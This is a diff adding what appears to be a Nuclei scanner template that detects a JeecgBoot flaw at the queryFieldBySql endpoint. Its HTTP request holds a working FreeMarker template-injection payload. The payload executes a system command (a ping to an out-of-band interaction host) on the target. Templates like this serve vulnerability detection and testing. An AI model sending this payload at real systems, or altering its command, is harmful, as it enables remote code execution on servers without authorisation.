@@ -1,0 +1,29 @@
+id: jeecg-boot-queryFieldBySql-sqli
+
+info:
+  name: Jeecg boot - SQL Injection
+  author: Co5mos
+  severity: critical
+  reference:
+    - https://c0olw.github.io/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/
+  tags: ssti,rce,oast,jeecg
+
+http:
+  - raw:
+      - |
+        POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/json
+
+        {"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"ping {{interactsh-url}}\") }' "}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - http
